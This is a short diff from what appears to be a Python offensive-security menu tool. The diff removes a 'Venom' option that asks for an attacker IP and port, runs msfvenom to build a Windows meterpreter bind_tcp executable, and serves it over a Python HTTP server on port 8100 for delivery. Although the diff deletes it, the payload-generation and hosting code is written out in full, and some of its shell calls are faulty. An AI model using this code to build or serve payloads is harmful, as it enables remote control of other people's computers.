@@ -958,32 +958,6 @@ while True:
 #
 #
 #
-
-    if action == "Venom":
-        isvenomgenerated=input("Did you already generate the payload with venom? y/n: ")
-        if isvenomgenerated == "n":
-            logging.info(f"Chosen action Venom to create a malicious payload")
-            venomcredip=input("Enter attacker IP: ")
-            venomcredport=input("Enter attacker port: ")
-            venomcommand='msfvenom -p windows/meterpreter/bind_tcp LHOST=' + venomcredip + ' LPORT=' + venomcredport + ' -f exe -o payload.exe'
-            os.system(venomcommand)
-            print("Payload generated as payload.exe")
-            sleep(1)
-            os.system("mkdir VenomPayload")
-            os.system("mv payload.exe VenomPayload")
-            os.system("cd VenomPayload")
-            os.system("python3 -m http.server 8100 --bind")
-            
-        else:
-            input("Put your payload.exe file in the VenomPayload folder and press Enter to continue...")
-            logging.info(f"Chosen action Venom to host already generated payload")
-            os.system("cd VenomPayload")
-            os.system("python3 -m http.server 8100 --bind")
-            print("Hosting payload on port 8100")    
-
-        sleep(2)
-        input("Press Enter to continue...")
-
     
    #Action exit = exiting the program
     if action == "exit":
